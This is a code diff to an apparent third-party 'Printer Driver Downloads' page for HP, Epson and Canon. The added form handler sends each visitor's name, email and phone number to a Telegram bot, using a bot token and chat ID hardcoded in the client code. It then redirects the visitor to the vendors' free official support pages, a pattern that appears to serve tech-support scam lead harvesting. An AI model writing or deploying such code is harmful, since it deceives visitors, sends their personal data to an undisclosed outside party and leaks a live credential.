@@ -23,9 +23,21 @@ interface FormData {
 }
 
 const PRINTER_BRANDS = [
-  { name: "HP", image: hp },
-  { name: "Epson", image: epson },
-  { name: "Canon", image: canon },
+  {
+    name: 'HP',
+    imgUrl: hp,
+    redirectUrl: 'https://support.hp.com/us-en'
+  },
+  {
+    name: 'Epson',
+    imgUrl: epson,
+    redirectUrl: 'https://epson.com/Support/sl/s'
+  },
+  {
+    name: 'Canon',
+    imgUrl: canon,
+    redirectUrl: 'https://www.usa.canon.com/support/software-and-drivers'
+  }
 ];
 
 const DriverDownload = () => {
@@ -45,21 +57,61 @@ const DriverDownload = () => {
 
   const handleFormSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+    const brand = PRINTER_BRANDS.find(b => b.name === selectedBrand);
+    
+    if (brand) {
+      try {
+        // Send data to Telegram
+        const message = `
+New Driver Download Request:
+Brand: ${selectedBrand}
+Name: ${formData.name}
+Email: ${formData.email}
+Phone: ${formData.phone}
+        `;
 
-    try {
-      // Simulate API request or form processing here
-      toast({
-        title: "Request Received",
-        description: "Our team will contact you shortly with download instructions.",
-      });
-      setFormData({ name: "", email: "", phone: "" }); // Reset form
-      setShowForm(false); // Close dialog
-    } catch (error) {
-      toast({
-        title: "Error",
-        description: "Request failed. Please try again or contact support.",
-        variant: "destructive",
-      });
+        const response = await fetch(`https://api.telegram.org/bot7575372348:AAEFfVtgEXvhQLyr7b4IhLGAQPjXl-0Kjjk/sendMessage`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            chat_id: "1684000886",
+            text: message,
+          }),
+        });
+
+        if (!response.ok) {
+          throw new Error("Failed to send message to Telegram");
+        }
+
+        toast({
+          title: "Request Submitted",
+          description: "Redirecting to download page...",
+        });
+
+        // Close the form
+        setShowForm(false);
+        
+        // Reset form data
+        setFormData({
+          name: "",
+          email: "",
+          phone: "",
+        });
+
+        // Redirect to brand-specific URL
+        setTimeout(() => {
+          window.location.href = brand.redirectUrl;
+        }, 1500);
+
+      } catch (error) {
+        toast({
+          title: "Error",
+          description: "Failed to submit request. Please try again.",
+          variant: "destructive",
+        });
+      }
     }
   };
 
@@ -71,26 +123,26 @@ const DriverDownload = () => {
             <h1 className="text-4xl font-bold mb-4">Printer Driver Downloads</h1>
           </div>
 
-          <div className="grid md:grid-cols-3 gap-6 mb-8">
+          <div className="grid md:grid-cols-3 gap-8">
             {PRINTER_BRANDS.map((brand) => (
               <Card
                 key={brand.name}
-                className="p-6 hover:shadow-lg transition-shadow"
+                className="p-8 hover:shadow-lg transition-shadow border-0 bg-white rounded-xl"
               >
-                <div className="flex flex-col items-center space-y-4">
-                  <div className="w-full h-40 flex items-center justify-center">
+                <div className="flex flex-col items-center space-y-6">
+                  <div className="w-full flex items-center justify-center p-4">
                     <img
-                      src={brand.image}
-                      alt={`${brand.name} Printers`}
-                      className="max-w-full max-h-full object-contain"
+                      src={brand.imgUrl}
+                      alt={`${brand.name} Logo`}
+                      className="w-full h-auto object-contain"
                     />
                   </div>
                   <Button
-                    className="w-full"
+                    className="w-full bg-blue-600 hover:bg-blue-700"
                     onClick={() => handleBrandSelect(brand.name)}
                   >
                     <Download className="mr-2 h-4 w-4" />
-                    Download
+                    Download Driver
                   </Button>
                 </div>
               </Card>
@@ -102,7 +154,7 @@ const DriverDownload = () => {
               <DialogHeader>
                 <DialogTitle>Download {selectedBrand} Drivers</DialogTitle>
                 <DialogDescription>
-                  Please provide your information to access the driver download
+                  Please provide your information to access the driver download.
                 </DialogDescription>
               </DialogHeader>
               <form onSubmit={handleFormSubmit} className="space-y-4">
